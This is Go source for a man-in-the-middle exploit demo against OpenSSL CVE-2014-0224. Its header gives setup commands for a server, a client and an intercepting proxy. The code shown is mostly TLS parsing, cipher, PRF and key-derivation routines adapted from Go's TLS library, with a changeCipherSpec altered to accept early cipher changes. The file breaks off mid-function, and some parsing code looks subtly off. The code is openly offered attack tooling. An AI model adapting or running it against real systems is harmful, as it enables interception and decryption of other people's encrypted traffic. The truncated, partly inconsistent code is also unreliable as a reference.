/* 
 * OPENSSL CVE-2014-0224 MITM exploit demo.
 *
 * Author : @bluerust
 * Ver    : 1.1
 * Desc   :
 * Only for openssl 1.0.1*, only tested for cipher RC4-SHA.
 *  a. server
 *   openssl s_server -debug -accept 443 -cert server.crt -certform PEM -key server.key -cipher RC4-SHA
 *   we don't want to discuss how to generate the certificate in here.
 *  b. client
 *   openssl s_client -connect 127.0.0.1:9999 -debug -cipher RC4-SHA
 *  c. mitm proxy
 *   go run proxy_all.go -host=127.0.0.1 -port 443 -listen_port=9999
 *
 *---------------------------
 *  References:
 *  [1] Early ChangeCipherSpec Attack (05 Jun 2014)
 *  https://www.imperialviolet.org/2014/06/05/earlyccs.html 
 *  [2] SSL/TLS MITM vulnerability (CVE-2014-0224)
 *  http://www.openssl.org/news/secadv_20140605.txt
 *  [3] How I discovered CCS Injection Vulnerability (CVE-2014-0224)
 *  http://ccsinjection.lepidum.co.jp/blog/2014-06-05/CCS-Injection-en/index.html
 *
 */ 
 
package main 
import (
    "crypto/elliptic"
    "crypto/x509"
    "errors"
    "encoding/hex"
    "fmt"
    "crypto/md5"
    "crypto/sha1"
    "crypto/rand"
    "crypto/sha256"
    "hash"
    "crypto/aes"
    "crypto/cipher"
    "crypto/des"
    "crypto/hmac"
    "crypto/rc4"
    "flag"  
    "net"  
    "os"  
    "runtime"  
    "strings"  
    "time"  
    "sync"
    "crypto/subtle"
    "io"
)

const (
    VersionSSL30 = 0x0300
    VersionTLS10 = 0x0301
    VersionTLS11 = 0x0302
    VersionTLS12 = 0x0303
)

const (
    maxPlaintext    = 16384        // maximum plaintext payload length
    maxCiphertext   = 16384 + 2048 // maximum ciphertext payload length
    recordHeaderLen = 5            // record header length
    maxHandshake    = 65536        // maximum handshake we support (protocol max is 16 MB)

    minVersion = VersionSSL30
    maxVersion = VersionTLS12
)

// TLS record types.
type recordType uint8

const (
    recordTypeChangeCipherSpec recordType = 20
    recordTypeAlert            recordType = 21
    recordTypeHandshake        recordType = 22
    recordTypeApplicationData  recordType = 23
)

// TLS handshake message types.
const (
    typeClientHello        uint8 = 1
    typeServerHello        uint8 = 2
    typeNewSessionTicket   uint8 = 4
    typeCertificate        uint8 = 11
    typeServerKeyExchange  uint8 = 12
    typeCertificateRequest uint8 = 13
    typeServerHelloDone    uint8 = 14
    typeCertificateVerify  uint8 = 15
    typeClientKeyExchange  uint8 = 16
    typeFinished           uint8 = 20
    typeCertificateStatus  uint8 = 22
    typeNextProtocol       uint8 = 67 // Not IANA assigned
)

// TLS compression types.
const (
    compressionNone uint8 = 0
)

// TLS extension numbers
const (
    extensionServerName          uint16 = 0
    extensionStatusRequest       uint16 = 5
    extensionSupportedCurves     uint16 = 10
    extensionSupportedPoints     uint16 = 11
    extensionSignatureAlgorithms uint16 = 13
    extensionSessionTicket       uint16 = 35
    extensionNextProtoNeg        uint16 = 13172 // not IANA assigned
    extensionRenegotiationInfo   uint16 = 0xff01
)

// TLS signaling cipher suite values
const (
    scsvRenegotiation uint16 = 0x00ff
)

// CurveID is the type of a TLS identifier for an elliptic curve. See
// http://www.iana.org/assignments/tls-parameters/tls-parameters.xml#tls-parameters-8
type CurveID uint16

const (
    CurveP256 CurveID = 23
    CurveP384 CurveID = 24
    CurveP521 CurveID = 25
)

// TLS Elliptic Curve Point Formats
// http://www.iana.org/assignments/tls-parameters/tls-parameters.xml#tls-parameters-9
const (
    pointFormatUncompressed uint8 = 0
)

// TLS CertificateStatusType (RFC 3546)
const (
    statusTypeOCSP uint8 = 1
)

// Certificate types (for certificateRequestMsg)
const (
    certTypeRSASign    = 1 // A certificate containing an RSA key
    certTypeDSSSign    = 2 // A certificate containing a DSA key
    certTypeRSAFixedDH = 3 // A certificate containing a static DH key
    certTypeDSSFixedDH = 4 // A certificate containing a static DH key

    // See RFC4492 sections 3 and 5.5.
    certTypeECDSASign      = 64 // A certificate containing an ECDSA-capable public key, signed with ECDSA.
    certTypeRSAFixedECDH   = 65 // A certificate containing an ECDH-capable public key, signed with RSA.
    certTypeECDSAFixedECDH = 66 // A certificate containing an ECDH-capable public key, signed with ECDSA.

    // Rest of these are reserved by the TLS spec
)

// Hash functions for TLS 1.2 (See RFC 5246, section A.4.1)
const (
    hashSHA1   uint8 = 2
    hashSHA256 uint8 = 4
)

// Signature algorithms for TLS 1.2 (See RFC 5246, section A.4.1)
const (
    signatureRSA   uint8 = 1
    signatureECDSA uint8 = 3
)

// signatureAndHash mirrors the TLS 1.2, SignatureAndHashAlgorithm struct. See
// RFC 5246, section A.4.1.
type signatureAndHash struct {
    hash, signature uint8
}

// supportedSKXSignatureAlgorithms contains the signature and hash algorithms
// that the code advertises as supported in a TLS 1.2 ClientHello.
var supportedSKXSignatureAlgorithms = []signatureAndHash{
    {hashSHA256, signatureRSA},
    {hashSHA256, signatureECDSA},
    {hashSHA1, signatureRSA},
    {hashSHA1, signatureECDSA},
}

// supportedClientCertSignatureAlgorithms contains the signature and hash
// algorithms that the code advertises as supported in a TLS 1.2
// CertificateRequest.
var supportedClientCertSignatureAlgorithms = []signatureAndHash{
    {hashSHA256, signatureRSA},
    {hashSHA256, signatureECDSA},
}

// ConnectionState records basic TLS details about the connection.
type ConnectionState struct {
    Version                    uint16                // TLS version used by the connection (e.g. VersionTLS12)
    HandshakeComplete          bool                  // TLS handshake is complete
    DidResume                  bool                  // connection resumes a previous TLS connection
    CipherSuite                uint16                // cipher suite in use (TLS_RSA_WITH_RC4_128_SHA, ...)
    NegotiatedProtocol         string                // negotiated next protocol (from Config.NextProtos)
    NegotiatedProtocolIsMutual bool                  // negotiated protocol was advertised by server
    ServerName                 string                // server name requested by client, if any (server side only)
    PeerCertificates           []*x509.Certificate   // certificate chain presented by remote peer
    VerifiedChains             [][]*x509.Certificate // verified chains built from PeerCertificates
}

// ClientAuthType declares the policy the server will follow for
// TLS Client Authentication.
type ClientAuthType int

const (
    NoClientCert ClientAuthType = iota
    RequestClientCert
    RequireAnyClientCert
    VerifyClientCertIfGiven
    RequireAndVerifyClientCert
)

// ClientSessionState contains the state needed by clients to resume TLS
// sessions.
type ClientSessionState struct {
    sessionTicket      []uint8             // Encrypted ticket used for session resumption with server
    vers               uint16              // SSL/TLS version negotiated for the session
    cipherSuite        uint16              // Ciphersuite negotiated for the session
    masterSecret       []byte              // MasterSecret generated by client on a full handshake
    serverCertificates []*x509.Certificate // Certificate chain presented by the server
}

// ClientSessionCache is a cache of ClientSessionState objects that can be used
// by a client to resume a TLS session with a given server. ClientSessionCache
// implementations should expect to be called concurrently from different
// goroutines.
type ClientSessionCache interface {
    // Get searches for a ClientSessionState associated with the given key.
    // On return, ok is true if one was found.
    Get(sessionKey string) (session *ClientSessionState, ok bool)

    // Put adds the ClientSessionState to the cache with the given key.
    Put(sessionKey string, cs *ClientSessionState)
}




type clientHelloMsg struct {
    raw                 []byte
    vers                uint16
    random              []byte
    sessionId           []byte
    cipherSuites        []uint16
    compressionMethods  []uint8
    nextProtoNeg        bool
    serverName          string
    ocspStapling        bool
    supportedCurves     []CurveID
    supportedPoints     []uint8
    ticketSupported     bool
    sessionTicket       []uint8
    signatureAndHashes  []signatureAndHash
    secureRenegotiation bool
}


func (m *clientHelloMsg) unmarshal(data []byte) bool {
    if len(data) < 42 {
        return false
    }
    m.raw = data
    m.vers = uint16(data[4])<<8 | uint16(data[5])
    m.random = data[6:38]
    sessionIdLen := int(data[38])
    if sessionIdLen > 32 || len(data) < 39+sessionIdLen {
        return false
    }
    m.sessionId = data[39 : 39+sessionIdLen]
    data = data[39+sessionIdLen:]
    if len(data) < 2 {
        return false
    }
    // cipherSuiteLen is the number of bytes of cipher suite numbers. Since
    // they are uint16s, the number must be even.
    cipherSuiteLen := int(data[0])<<8 | int(data[1])
    if cipherSuiteLen%2 == 1 || len(data) < 2+cipherSuiteLen {
        return false
    }
    numCipherSuites := cipherSuiteLen / 2
    m.cipherSuites = make([]uint16, numCipherSuites)
    for i := 0; i < numCipherSuites; i++ {
        m.cipherSuites[i] = uint16(data[2+2*i])<<8 | uint16(data[3+2*i])
        if m.cipherSuites[i] == scsvRenegotiation {
            m.secureRenegotiation = true
        }
    }
    data = data[2+cipherSuiteLen:]
    if len(data) < 1 {
        return false
    }
    compressionMethodsLen := int(data[0])
    if len(data) < 1+compressionMethodsLen {
        return false
    }
    m.compressionMethods = data[1 : 1+compressionMethodsLen]

    data = data[1+compressionMethodsLen:]

    m.nextProtoNeg = false
    m.serverName = ""
    m.ocspStapling = false
    m.ticketSupported = false
    m.sessionTicket = nil
    m.signatureAndHashes = nil

    if len(data) == 0 {
        // ClientHello is optionally followed by extension data
        return true
    }
    if len(data) < 2 {
        return false
    }

    extensionsLength := int(data[0])<<8 | int(data[1])
    data = data[2:]
    if extensionsLength != len(data) {
        return false
    }

    for len(data) != 0 {
        if len(data) < 4 {
            return false
        }
        extension := uint16(data[0])<<8 | uint16(data[1])
        length := int(data[2])<<8 | int(data[3])
        data = data[4:]
        if len(data) < length {
            return false
        }

        switch extension {
        case extensionServerName:
            if length < 2 {
                return false
            }
            numNames := int(data[0])<<8 | int(data[1])
            d := data[2:]
            for i := 0; i < numNames; i++ {
                if len(d) < 3 {
                    return false
                }
                nameType := d[0]
                nameLen := int(d[1])<<8 | int(d[2])
                d = d[3:]
                if len(d) < nameLen {
                    return false
                }
                if nameType == 0 {
                    m.serverName = string(d[0:nameLen])
                    break
                }
                d = d[nameLen:]
            }
        case extensionNextProtoNeg:
            if length > 0 {
                return false
            }
            m.nextProtoNeg = true
        case extensionStatusRequest:
            m.ocspStapling = length > 0 && data[0] == statusTypeOCSP
        case extensionSupportedCurves:
            // http://tools.ietf.org/html/rfc4492#section-5.5.1
            if length < 2 {
                return false
            }
            l := int(data[0])<<8 | int(data[1])
            if l%2 == 1 || length != l+2 {
                return false
            }
            numCurves := l / 2
            m.supportedCurves = make([]CurveID, numCurves)
            d := data[2:]
            for i := 0; i < numCurves; i++ {
                m.supportedCurves[i] = CurveID(d[0])<<8 | CurveID(d[1])
                d = d[2:]
            }
        case extensionSupportedPoints:
            // http://tools.ietf.org/html/rfc4492#section-5.5.2
            if length < 1 {
                return false
            }
            l := int(data[0])
            if length != l+1 {
                return false
            }
            m.supportedPoints = make([]uint8, l)
            copy(m.supportedPoints, data[1:])
        case extensionSessionTicket:
            // http://tools.ietf.org/html/rfc5077#section-3.2
            m.ticketSupported = true
            m.sessionTicket = data[:length]
        case extensionSignatureAlgorithms:
            // https://tools.ietf.org/html/rfc5246#section-7.4.1.4.1
            if length < 2 || length&1 != 0 {
                return false
            }
            l := int(data[0])<<8 | int(data[1])
            if l != length-2 {
                return false
            }
            n := l / 2
            d := data[2:]
            m.signatureAndHashes = make([]signatureAndHash, n)
            for i := range m.signatureAndHashes {
                m.signatureAndHashes[i].hash = d[0]
                m.signatureAndHashes[i].signature = d[1]
                d = d[2:]
            }
        case extensionRenegotiationInfo + 1:
            if length != 1 || data[0] != 0 {
                return false
            }
            m.secureRenegotiation = true
        }
        data = data[length:]
    }

    return true
}

type serverHelloMsg struct {
    raw                 []byte
    vers                uint16
    random              []byte
    sessionId           []byte
    cipherSuite         uint16
    compressionMethod   uint8
    nextProtoNeg        bool
    nextProtos          []string
    ocspStapling        bool
    ticketSupported     bool
    secureRenegotiation bool
}

func (m *serverHelloMsg) unmarshal(data []byte) bool {
    if len(data) < 42 {
        return false
    }
    m.raw = data
    m.vers = uint16(data[4])<<8 | uint16(data[5])
    m.random = data[6:38]
    sessionIdLen := int(data[38])
    if sessionIdLen > 32 || len(data) < 39+sessionIdLen {
        return false
    }
    m.sessionId = data[39 : 39+sessionIdLen]
    data = data[39+sessionIdLen:]
    if len(data) < 3 {
        return false
    }
    m.cipherSuite = uint16(data[0])<<8 | uint16(data[1])
    m.compressionMethod = data[2]
    data = data[3:]

    m.nextProtoNeg = false
    m.nextProtos = nil
    m.ocspStapling = false
    m.ticketSupported = false

    if len(data) == 0 {
        // ServerHello is optionally followed by extension data
        return true
    }
    if len(data) < 2 {
        return false
    }

    extensionsLength := int(data[0])<<8 | int(data[1])
    data = data[2:]
    if len(data) != extensionsLength {
        return false
    }

    for len(data) != 0 {
        if len(data) < 4 {
            return false
        }
        extension := uint16(data[0])<<8 | uint16(data[1])
        length := int(data[2])<<8 | int(data[3])
        data = data[4:]
        if len(data) < length {
            return false
        }

        switch extension {
        case extensionNextProtoNeg:
            m.nextProtoNeg = true
            d := data[:length]
            for len(d) > 0 {
                l := int(d[0])
                d = d[1:]
                if l == 0 || l > len(d) {
                    return false
                }
                m.nextProtos = append(m.nextProtos, string(d[:l]))
                d = d[l:]
            }
        case extensionStatusRequest:
            if length > 0 {
                return false
            }
            m.ocspStapling = true
        case extensionSessionTicket:
            if length > 0 {
                return false
            }
            m.ticketSupported = true
        case extensionRenegotiationInfo:
            if length != 1 || data[0] != 0 {
                return false
            }
            m.secureRenegotiation = true
        }
        data = data[length:]
    }

    return true
}



const (
    // suiteECDH indicates that the cipher suite involves elliptic curve
    // Diffie-Hellman. This means that it should only be selected when the
    // client indicates that it supports ECC with a curve and point format
    // that we're happy with.
    suiteECDHE = 1 << iota
    // suiteECDSA indicates that the cipher suite involves an ECDSA
    // signature and therefore may only be selected when the server's
    // certificate is ECDSA. If this is not set then the cipher suite is
    // RSA based.
    suiteECDSA
    // suiteTLS12 indicates that the cipher suite should only be advertised
    // and accepted when using TLS 1.2.
    suiteTLS12
)

// A cipherSuite is a specific combination of key agreement, cipher and MAC
// function. All cipher suites currently assume RSA key agreement.
type cipherSuite struct {
    id uint16
    // the lengths, in bytes, of the key material needed for each component.
    keyLen int
    macLen int
    ivLen  int
    // flags is a bitmask of the suite* values, above.
    flags  int
    cipher func(key, iv []byte, isRead bool) interface{}
    mac    func(version uint16, macKey []byte) macFunction
    aead   func(key, fixedNonce []byte) cipher.AEAD
}

var cipherSuites = []*cipherSuite{
    // Ciphersuite order is chosen so that ECDHE comes before plain RSA
    // and RC4 comes before AES (because of the Lucky13 attack).
    {TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, 16, 0, 4, suiteECDHE | suiteTLS12, nil, nil, aeadAESGCM},
    {TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, 16, 0, 4, suiteECDHE | suiteECDSA | suiteTLS12, nil, nil, aeadAESGCM},
    {TLS_ECDHE_RSA_WITH_RC4_128_SHA, 16, 20, 0, suiteECDHE, cipherRC4, macSHA1, nil},
    {TLS_ECDHE_ECDSA_WITH_RC4_128_SHA, 16, 20, 0, suiteECDHE | suiteECDSA, cipherRC4, macSHA1, nil},
    {TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA, 16, 20, 16, suiteECDHE, cipherAES, macSHA1, nil},
    {TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA, 16, 20, 16, suiteECDHE | suiteECDSA, cipherAES, macSHA1, nil},
    {TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA, 32, 20, 16, suiteECDHE, cipherAES, macSHA1, nil},
    {TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA, 32, 20, 16, suiteECDHE | suiteECDSA, cipherAES, macSHA1, nil},
    {TLS_RSA_WITH_RC4_128_SHA, 16, 20, 0,  0, cipherRC4, macSHA1, nil},
    {TLS_RSA_WITH_AES_128_CBC_SHA, 16, 20, 16, 0, cipherAES, macSHA1, nil},
    {TLS_RSA_WITH_AES_256_CBC_SHA, 32, 20, 16, 0, cipherAES, macSHA1, nil},
    {TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA, 24, 20, 8,  suiteECDHE, cipher3DES, macSHA1, nil},
    {TLS_RSA_WITH_3DES_EDE_CBC_SHA, 24, 20, 8, 0, cipher3DES, macSHA1, nil},
}

func cipherRC4(key, iv []byte, isRead bool) interface{} {
    cipher, _ := rc4.NewCipher(key)
    return cipher
}

func cipher3DES(key, iv []byte, isRead bool) interface{} {
    block, _ := des.NewTripleDESCipher(key)
    if isRead {
        return cipher.NewCBCDecrypter(block, iv)
    }
    return cipher.NewCBCEncrypter(block, iv)
}

func cipherAES(key, iv []byte, isRead bool) interface{} {
    block, _ := aes.NewCipher(key)
    if isRead {
        return cipher.NewCBCDecrypter(block, iv)
    }
    return cipher.NewCBCEncrypter(block, iv)
}

// macSHA1 returns a macFunction for the given protocol version.
func macSHA1(version uint16, key []byte) macFunction {
    if version == VersionSSL30 {
        mac := ssl30MAC{
            h:   sha1.New(),
            key: make([]byte, len(key)),
        }
        copy(mac.key, key)
        return mac
    }
    return tls10MAC{hmac.New(sha1.New, key)}
}

type macFunction interface {
    Size() int
    MAC(digestBuf, seq, header, data []byte) []byte
}

// fixedNonceAEAD wraps an AEAD and prefixes a fixed portion of the nonce to
// each call.
type fixedNonceAEAD struct {
    // sealNonce and openNonce are buffers where the larger nonce will be
    // constructed. Since a seal and open operation may be running
    // concurrently, there is a separate buffer for each.
    sealNonce, openNonce []byte
    aead                 cipher.AEAD
}

func (f *fixedNonceAEAD) NonceSize() int { return 8 }
func (f *fixedNonceAEAD) Overhead() int  { return f.aead.Overhead() }

func (f *fixedNonceAEAD) Seal(out, nonce, plaintext, additionalData []byte) []byte {
    copy(f.sealNonce[len(f.sealNonce)-8:], nonce)
    return f.aead.Seal(out, f.sealNonce, plaintext, additionalData)
}

func (f *fixedNonceAEAD) Open(out, nonce, plaintext, additionalData []byte) ([]byte, error) {
    copy(f.openNonce[len(f.openNonce)-8:], nonce)
    return f.aead.Open(out, f.openNonce, plaintext, additionalData)
}

func aeadAESGCM(key, fixedNonce []byte) cipher.AEAD {
    aes, err := aes.NewCipher(key)
    if err != nil {
        panic(err)
    }
    aead, err := cipher.NewGCM(aes)
    if err != nil {
        panic(err)
    }

    nonce1, nonce2 := make([]byte, 12), make([]byte, 12)
    copy(nonce1, fixedNonce)
    copy(nonce2, fixedNonce)

    return &fixedNonceAEAD{nonce1, nonce2, aead}
}

// ssl30MAC implements the SSLv3 MAC function, as defined in
// www.mozilla.org/projects/security/pki/nss/ssl/draft302.txt section 5.2.3.1
type ssl30MAC struct {
    h   hash.Hash
    key []byte
}

func (s ssl30MAC) Size() int {
    return s.h.Size()
}

var ssl30Pad1 = [48]byte{0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36}

var ssl30Pad2 = [48]byte{0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c}

func (s ssl30MAC) MAC(digestBuf, seq, header, data []byte) []byte {
    padLength := 48
    if s.h.Size() == 20 {
        padLength = 40
    }

    s.h.Reset()
    s.h.Write(s.key)
    s.h.Write(ssl30Pad1[:padLength])
    s.h.Write(seq)
    s.h.Write(header[:1])
    s.h.Write(header[3:5])
    s.h.Write(data)
    digestBuf = s.h.Sum(digestBuf[:0])

    s.h.Reset()
    s.h.Write(s.key)
    s.h.Write(ssl30Pad2[:padLength])
    s.h.Write(digestBuf)
    return s.h.Sum(digestBuf[:0])
}

// tls10MAC implements the TLS 1.0 MAC function. RFC 2246, section 6.2.3.
type tls10MAC struct {
    h hash.Hash
}

func (s tls10MAC) Size() int {
    return s.h.Size()
}

func (s tls10MAC) MAC(digestBuf, seq, header, data []byte) []byte {
    s.h.Reset()
    s.h.Write(seq)
    s.h.Write(header)
    s.h.Write(data)
    return s.h.Sum(digestBuf[:0])
}

// Copyright 2010 The Go Authors. All rights reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.


var errClientKeyExchange = errors.New("tls: invalid ClientKeyExchange message")
var errServerKeyExchange = errors.New("tls: invalid ServerKeyExchange message")

// rsaKeyAgreement implements the standard TLS key agreement where the client
// encrypts the pre-master secret to the server's public key.
type rsaKeyAgreement struct{}


// sha1Hash calculates a SHA1 hash over the given byte slices.
func sha1Hash(slices [][]byte) []byte {
    hsha1 := sha1.New()
    for _, slice := range slices {
        hsha1.Write(slice)
    }
    return hsha1.Sum(nil)
}

// md5SHA1Hash implements TLS 1.0's hybrid hash function which consists of the
// concatenation of an MD5 and SHA1 hash.
func md5SHA1Hash(slices [][]byte) []byte {
    md5sha1 := make([]byte, md5.Size+sha1.Size)
    hmd5 := md5.New()
    for _, slice := range slices {
        hmd5.Write(slice)
    }
    copy(md5sha1, hmd5.Sum(nil))
    copy(md5sha1[md5.Size:], sha1Hash(slices))
    return md5sha1
}

// sha256Hash implements TLS 1.2's hash function.
func sha256Hash(slices [][]byte) []byte {
    h := sha256.New()
    for _, slice := range slices {
        h.Write(slice)
    }
    return h.Sum(nil)
}


func curveForCurveID(id CurveID) (elliptic.Curve, bool) {
    switch id {
    case CurveP256:
        return elliptic.P256(), true
    case CurveP384:
        return elliptic.P384(), true
    case CurveP521:
        return elliptic.P521(), true
    default:
        return nil, false
    }

}


// mutualCipherSuite returns a cipherSuite given a list of supported
// ciphersuites and the id requested by the peer.
func mutualCipherSuite(have []uint16, want uint16) *cipherSuite {
    for _, id := range have {
        if id == want {
            for _, suite := range cipherSuites {
                if suite.id == want {
                    return suite
                }
            }
            return nil
        }
    }
    return nil
}

// mutualCipherSuite returns a cipherSuite given a list of supported
// ciphersuites and the id requested by the peer.
func getCipherSuite(want uint16) *cipherSuite {
    for _, suite := range cipherSuites {
        if suite.id == want {
            return suite
        }
    }
    
    return nil
}

// A list of the possible cipher suite ids. Taken from
// http://www.iana.org/assignments/tls-parameters/tls-parameters.xml
const (
    TLS_RSA_WITH_RC4_128_SHA                uint16 = 0x0005 // RC4-SHA
    TLS_RSA_WITH_3DES_EDE_CBC_SHA           uint16 = 0x000a // SRP-RSA-3DES-EDE-CBC-SHA
    TLS_RSA_WITH_AES_128_CBC_SHA            uint16 = 0x002f
    TLS_RSA_WITH_AES_256_CBC_SHA            uint16 = 0x0035
    TLS_ECDHE_ECDSA_WITH_RC4_128_SHA        uint16 = 0xc007
    TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA    uint16 = 0xc009
    TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA    uint16 = 0xc00a
    TLS_ECDHE_RSA_WITH_RC4_128_SHA          uint16 = 0xc011
    TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA     uint16 = 0xc012
    TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA      uint16 = 0xc013
    TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA      uint16 = 0xc014
    TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256   uint16 = 0xc02f
    TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 uint16 = 0xc02b // ECDHE-ECDSA-AES128-GCM-SHA256
)



// pHash implements the P_hash function, as defined in RFC 4346, section 5.
func pHash(result, secret, seed []byte, hash func() hash.Hash) {
    h := hmac.New(hash, secret)
    h.Write(seed)
    a := h.Sum(nil)

    j := 0
    for j < len(result) {
        h.Reset()
        h.Write(a)
        h.Write(seed)
        b := h.Sum(nil)
        todo := len(b)
        if j+todo > len(result) {
            todo = len(result) - j
        }
        copy(result[j:j+todo], b)
        j += todo

        h.Reset()
        h.Write(a)
        a = h.Sum(nil)
    }
}

// prf10 implements the TLS 1.0 pseudo-random function, as defined in RFC 2246, section 5.
func prf10(result, secret, label, seed []byte) {
    hashSHA1 := sha1.New
    hashMD5 := md5.New

    labelAndSeed := make([]byte, len(label)+len(seed))
    copy(labelAndSeed, label)
    copy(labelAndSeed[len(label):], seed)

    s1, s2 := splitPreMasterSecret(secret)
    pHash(result, s1, labelAndSeed, hashMD5)
    result2 := make([]byte, len(result))
    pHash(result2, s2, labelAndSeed, hashSHA1)

    for i, b := range result2 {
        result[i] ^= b
    }
}

// prf12 implements the TLS 1.2 pseudo-random function, as defined in RFC 5246, section 5.
func prf12(result, secret, label, seed []byte) {
    labelAndSeed := make([]byte, len(label)+len(seed))
    copy(labelAndSeed, label)
    copy(labelAndSeed[len(label):], seed)

    pHash(result, secret, labelAndSeed, sha256.New)
}

// prf30 implements the SSL 3.0 pseudo-random function, as defined in
// www.mozilla.org/projects/security/pki/nss/ssl/draft302.txt section 6.
func prf30(result, secret, label, seed []byte) {
    hashSHA1 := sha1.New()
    hashMD5 := md5.New()

    done := 0
    i := 0
    // RFC5246 section 6.3 says that the largest PRF output needed is 128
    // bytes. Since no more ciphersuites will be added to SSLv3, this will
    // remain true. Each iteration gives us 16 bytes so 10 iterations will
    // be sufficient.
    var b [11]byte
    for done < len(result) {
        for j := 0; j <= i; j++ {
            b[j] = 'A' + byte(i)
        }

        hashSHA1.Reset()
        hashSHA1.Write(b[:i+1])
        hashSHA1.Write(secret)
        hashSHA1.Write(seed)
        digest := hashSHA1.Sum(nil)

        hashMD5.Reset()
        hashMD5.Write(secret)
        hashMD5.Write(digest)

        done += copy(result[done:], hashMD5.Sum(nil))
        i++
    }
}

const (
    tlsRandomLength      = 32 // Length of a random nonce in TLS 1.1.
    masterSecretLength   = 48 // Length of a master secret in TLS 1.1.
    finishedVerifyLength = 12 // Length of verify_data in a Finished message.
)

var masterSecretLabel = []byte("master secret")
var keyExpansionLabel = []byte("key expansion")
var clientFinishedLabel = []byte("client finished")
var serverFinishedLabel = []byte("server finished")

func prfForVersion(version uint16) func(result, secret, label, seed []byte) {
    switch version {
    case VersionSSL30:
        return prf30
    case VersionTLS10, VersionTLS11:
        return prf10
    case VersionTLS12:
        return prf12
    default:
        panic("unknown version")
    }
}

// Split a premaster secret in two as specified in RFC 4346, section 5.
func splitPreMasterSecret(secret []byte) (s1, s2 []byte) {
    s1 = secret[0 : (len(secret)+1)/2]
    s2 = secret[len(secret)/2:]
    return
}

// keysFromMasterSecret generates the connection keys from the master
// secret, given the lengths of the MAC key, cipher key and IV, as defined in
// RFC 2246, section 6.3.
func keysFromMasterSecret(version uint16, masterSecret, clientRandom, serverRandom []byte, macLen, keyLen, ivLen int) (clientMAC, serverMAC, clientKey, serverKey, clientIV, serverIV []byte) {
    var seed [tlsRandomLength * 2]byte
    copy(seed[0:len(clientRandom)], serverRandom)
    copy(seed[len(serverRandom):], clientRandom)

    n := 2*macLen + 2*keyLen + 2*ivLen
    keyMaterial := make([]byte, n)
    prfForVersion(version)(keyMaterial, masterSecret, keyExpansionLabel, seed[0:])
    clientMAC = keyMaterial[:macLen]
    keyMaterial = keyMaterial[macLen:]
    serverMAC = keyMaterial[:macLen]
    keyMaterial = keyMaterial[macLen:]
    clientKey = keyMaterial[:keyLen]
    keyMaterial = keyMaterial[keyLen:]
    serverKey = keyMaterial[:keyLen]
    keyMaterial = keyMaterial[keyLen:]
    clientIV = keyMaterial[:ivLen]
    keyMaterial = keyMaterial[ivLen:]
    serverIV = keyMaterial[:ivLen]
    return
}

  
func die(format string, v ...interface{}) {  
    os.Stderr.WriteString(fmt.Sprintf(format+"\n", v...))  
    os.Exit(1)  
}  
  
  
func format_time(t time.Time) string {  
    return t.Format("2006.01.02-15.04.05")  
}  
  
func printable_addr(a net.Addr) string {  
    return strings.Replace(a.String(), ":", "-", -1)  
}  

/**********************************************************************************/
// A halfConn represents one direction of the record layer
// connection, either sending or receiving.
type halfConn struct {
    sync.Mutex

    err     error       // first permanent error
    version uint16      // protocol version
    cipher  interface{} // cipher algorithm
    mac     macFunction
    seq     [8]byte // 64-bit sequence number
    bfree   *block  // list of free blocks

    nextCipher interface{} // next encryption state
    nextMac    macFunction // next MAC algorithm

    // used to save allocating a new buffer for each MAC.
    inDigestBuf, outDigestBuf []byte
}

func (hc *halfConn) setErrorLocked(err error) error {
    hc.err = err
    return err
}

func (hc *halfConn) error() error {
    hc.Lock()
    err := hc.err
    hc.Unlock()
    return err
}

// prepareCipherSpec sets the encryption and MAC states
// that a subsequent changeCipherSpec will use.
func (hc *halfConn) prepareCipherSpec(version uint16, cipher interface{}, mac macFunction) {
    hc.version = version
    hc.nextCipher = cipher
    hc.nextMac = mac
}

// changeCipherSpec changes the encryption and MAC states
// to the ones previously passed to prepareCipherSpec.
func (hc *halfConn) changeCipherSpec() error {
    if hc.nextCipher == nil {
        //return alertInternalError
        return nil
    }
    hc.cipher = hc.nextCipher
    hc.mac = hc.nextMac
    hc.nextCipher = nil
    hc.nextMac = nil
    for i := range hc.seq {
        hc.seq[i] = 0
    }
    return nil
}

// incSeq increments the sequence number.
func (hc *halfConn) incSeq() {
    for i := 7; i >= 0; i-- {
        hc.seq[i]++
        if hc.seq[i] != 0 {
            return
        }
    }

    // Not allowed to let sequence number wrap.
    // Instead, must renegotiate before it does.
    // Not likely enough to bother.
    panic("TLS: sequence number wraparound")
}

// resetSeq resets the sequence number to zero.
func (hc *halfConn) resetSeq() {
    for i := range hc.seq {
        hc.seq[i] = 0
    }
}

// removePadding returns an unpadded slice, in constant time, which is a prefix
// of the input. It also returns a byte which is equal to 255 if the padding
// was valid and 0 otherwise. See RFC 2246, section 6.2.3.2
func removePadding(payload []byte) ([]byte, byte) {
    if len(payload) < 1 {
        return payload, 0
    }

    paddingLen := payload[len(payload)-1]
